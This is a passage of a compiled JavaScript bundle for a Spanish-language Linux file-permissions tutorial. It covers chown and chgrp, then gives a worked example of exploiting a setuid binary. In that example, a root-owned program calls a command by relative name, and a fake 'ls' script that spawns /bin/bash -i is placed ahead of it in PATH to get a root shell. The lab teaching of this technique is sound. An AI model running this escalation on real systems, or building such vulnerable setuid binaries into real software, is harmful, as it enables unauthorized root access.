archivo\r\n# Cambiar el propietario y el grupo de un archivo\r\nsudo chown usuario:grupo archivo\n"})}),"\n",(0,i.jsx)(r.h3,{id:"chgrp",children:"chgrp"}),"\n",(0,i.jsxs)(r.p,{children:["El comando ",(0,i.jsx)(r.strong,{children:"chgrp"})," (change group) permite cambiar el grupo de un archivo o directorio."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Cambiar el grupo de un archivo\r\nsudo chgrp grupo archivo\n"})}),"\n",(0,i.jsx)(r.h2,{id:"caso-pr\xe1ctico-explotando-el-bit-setuid",children:"Caso pr\xe1ctico: Explotando el bit setuid"}),"\n",(0,i.jsx)(r.p,{children:"El bit setuid permite que un archivo se ejecute con los permisos del propietario. En este caso pr\xe1ctico se explota el bit setuid para obtener una shell con privilegios de superusuario."}),"\n",(0,i.jsxs)(r.ol,{children:["\n",(0,i.jsx)(r.li,{children:"Crear un archivo con un programa que cambie el UID a 0 y ejecute una shell."}),"\n",(0,i.jsx)(r.li,{children:"Compilar el archivo y establecer el bit setuid."}),"\n",(0,i.jsx)(r.li,{children:"Ejecutar el archivo para obtener una shell con privilegios de superusuario."}),"\n",(0,i.jsx)(r.li,{children:"Encontrar el archivo con bit setuid."}),"\n",(0,i.jsx)(r.li,{children:'Crear un ejecutable que se llame "ls" que abra una consola interactiva'}),"\n",(0,i.jsx)(r.li,{children:"Agregar el ejecutable al PATH"}),"\n"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:'# Crear un archivo con bit setuid\r\nvim exploit.c\r\n# Contenido del fichero\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sys/types.h>\r\n\r\nint main() {\r\n    setuid(0);\r\n    system("ls /home/user");\r\n    return 0;\r\n}\r\n# Compilar el archivo\r\ngcc exploit.c -o exploit\r\n# Establecer el propietario y el grupo\r\nsudo chown root:root exploit\r\n# Establecer el bit setuid\r\nsudo chmod u+s exploit\r\n# Ejecutar el archivo\r\n./exploit\r\n# Encontrar archivos con bit setuid\r\nfind / -type f -perm -4001 2> /dev/null\r\n# Crear un ejecutable que abra una consola interactiva\r\nvim ls\r\n# Contenido del fichero\r\n#!/bin/bash\r\n/bin/bash -i\r\n# Damos permisos de ejecuci\xf3n\r\nchmod +x ls\r\n# Agregar al PATH\r\nexport PATH=/home/user:$PATH\r\n# Ejecutamos exploit con el usuario user\r\n./exploit\n'})})]})}function t(e={}){const{wrapper:r}={...(0,n.R)(),...e.components};return r?(0,i.jsx)(r,{...e,children:(0,i.jsx)(u,{...e})}):u(e)}},8453:(e,r,s)=>{s.d(r,{R:()=>a,x:()=>c});var i=s(6540);const n={},o=i.createContext(n);function a(e){const r=i.useContext(o);return i.useMemo((function(){return"function"==typeof e?e(r):{...r,...e}}),[r,e])}function c(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(n):e.components||n:a(e.components),i.createElement(o.Provider,{value:r},e.children)}}}]);